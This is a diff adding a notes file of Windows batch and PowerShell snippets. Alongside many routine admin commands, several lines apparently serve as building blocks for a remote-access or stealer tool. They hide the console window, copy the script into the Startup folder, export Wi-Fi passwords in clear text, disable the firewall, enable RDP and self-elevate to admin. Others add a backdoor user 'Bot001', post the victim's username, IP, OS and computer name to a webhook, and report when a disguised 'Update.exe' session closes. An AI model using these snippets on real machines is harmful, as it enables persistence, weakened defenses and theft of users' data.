@@ -1,0 +1,168 @@
+*curl download
+curl -o thatpage.html http://www.example.com/
+curl -O http://www.example.com/index.html
+curl -O www.haxx.se/index.html -O curl.se/download.html
+
+*Curl cookies
+Set-Cookie: sessionid=boo123; path="/foo";
+curl -c cookies.txt www.example.com
+
+*Hidde current cmd window
+powershell.exe -windowstyle Hidden -command
+
+*Encryption
+FF FE 0A 0D
+
+*Set batch file as startup
+copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+*Save wifi password as xml
+netsh wlan export profile key=clear
+
+*Powershell download
+powershell -command Invoke-WebRequest "http://download.com/Application.exe" -OutFile "C:\Application.exe"
+
+*Get ram info
+systeminfo | find "Total Physical Memory:"
+
+*Open port
+netsh advfirewall firewall add rule name=%name% protocol=UDP localport=%udp% action=allow dir=IN
+
+*Get mac address
+getmac
+
+*Get hostname
+hostname
+
+*Net station
+netstat
+
+*List tasks
+tasklist
+
+*Kill tasks
+taskkill
+
+*Username+homename
+whoami
+
+*Show logon date/time
+QUser
+
+*Show proccess on all users
+QProcess
+
+*Show RDP Ports that on Listen
+QWinsta
+
+*Login a domain with user/password
+runas /user:Domain\Username cmd.exe
+
+*Trace an ip address
+tracert google.com
+tracert 192.168.1.1
+
+*All drivers that installed for softwares
+driverquery
+
+*Neth firewall rule commands
+netsh advfirewall firewall add rule ?
+
+*Open local port
+netsh advfirewall firewall add rule name= "Port80" dir=in action=allow protocol=TCP localport=80
+
+*Disable firewall
+netsh advfirewall set currentprofile state off
+
+*Netsh Sharing options
+netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+netsh advfirewall firewall set rule group="Public Folder Shareing" new enable=Yes
+
+*Enable RDP
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+*Network adapter details
+Netsh interface ipv4 show config Ethernet
+
+*Get admin plivages
+Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)
+
+*MsgBox&Vbs
+echo Msgbox("Hi!") >> MsgBox.vbs
+start MsgBox.vbs
+
+*Error Level
+IF %ERRORLEVEL% NEQ 0 Echo An error was found
+IF %ERRORLEVEL% EQU 0 Echo No error found
+
+*Get Extended network report as html
+netsh wlan show wlanreport
+
+*Check Internet Connection
+ping "127.0.0.1"
+IF %ERRORLEVEL% NEQ 0 Echo No Internet
+IF %ERRORLEVEL% EQU 0 echo.
+
+*Current Batch File Location
+%~dp0
+
+*Add user
+net user Bot001 123 /add
+
+*Connect User
+runas /user:Bot001 cmd.exe
+runas /user:Bot001 "powershell -c ping 127.0.0.1"
+
+*curl / webhook
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+
+*list ip's/mac to connected to internet
+arp -a
+Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true | Select-Object -ExpandProperty IPAddress
+
+*Public IP Addresse
+curl api.ipify.org
+
+*Get Public ip and set as value
+set ip=curl api.ipify.org
+echo %ip%
+
+*Github automaticly download link
+https://github.com/NAME/NAME/raw/main/NAME.exe
+
+*IP Scanner
+curl ifconfig.co/json?ip=1.1.1.1
+curl ifconfig.co/
+curl ifconfig.co/country
+curl ifconfig.co/country-iso
+curl ifconfig.co/city
+curl ifconfig.co/asn
+curl ifconfig.co/json
+curl ifconfig.co/port/80
+
+*Show avileable networks
+netsh wlan show networks|find "SSID"
+
+*Shutdown
+shutdown /p
+
+*Start new cmd window with any command
+start echo test
+
+*Check if task exists
+:q
+tasklist /fi "ImageName eq Update.exe" /fo csv 2>NUL | find /I "Update.exe">NUL
+if %ERRORLEVEL%==1 (
+	echo Not runing
+	curl -X POST -H "Content-type: application/json" --data "{\"content\": \"``[-] {ip}: Session closed``\"}" %webhook%
+	exit
+)
+goto q
+
+*Extract zip file
+tar -xf archive.zip
+
+*
+curl api.ipify.org > ip.txt
+for /f "delims=" %%a in ('type ip.txt') do @set ip=%%a
